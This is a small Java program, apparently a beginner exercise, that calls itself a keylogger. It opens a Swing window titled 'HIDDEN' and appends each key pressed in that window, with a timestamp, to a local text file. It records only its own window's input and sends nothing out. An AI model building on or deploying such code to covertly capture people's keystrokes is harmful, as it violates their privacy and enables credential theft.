import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import javax.swing.JFrame;
import java.io.FileWriter;
import java.io.IOException;

class KeyLogger extends JFrame implements KeyListener{

    public KeyLogger(){
        setTitle("HIDDEN");
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        addKeyListener(this);
        setFocusable(true);
        setVisible(true);
    }
    
    @Override
    public void keyPressed(KeyEvent e) { // find key pressed action
        String log = "Time:" + time() + " Key Pressed: " + KeyEvent.getKeyText(e.getKeyCode()) + "\n"; // put together the output
        writetofile(log); // send output to be appended
    }


    private static void writetofile(String output){
        try{
            FileWriter myWriter = new FileWriter("filename.txt", true); // call the file to write to
            myWriter.append(output); // add output to file
            myWriter.close();
            }catch(IOException e){ // print the error
                System.out.println("This didn't work");
                e.printStackTrace(); // or System.out.println(e); to print the error
            }
    }
    private static String time(){
        LocalDateTime myDateTime = LocalDateTime.now(); // call the full date down to the sec
        DateTimeFormatter myDateTimeFormatter = DateTimeFormatter.ofPattern("dd-MM-yyyy HH:mm:ss"); // format the date to desired outcome
        return myDateTime.format(myDateTimeFormatter); // return formatted date
    }
    public static void main(String[] args) {
        new KeyLogger();
    }


    // don't really need
    @Override
    public void keyReleased(KeyEvent e) {}

    @Override
    public void keyTyped(KeyEvent e) {}

}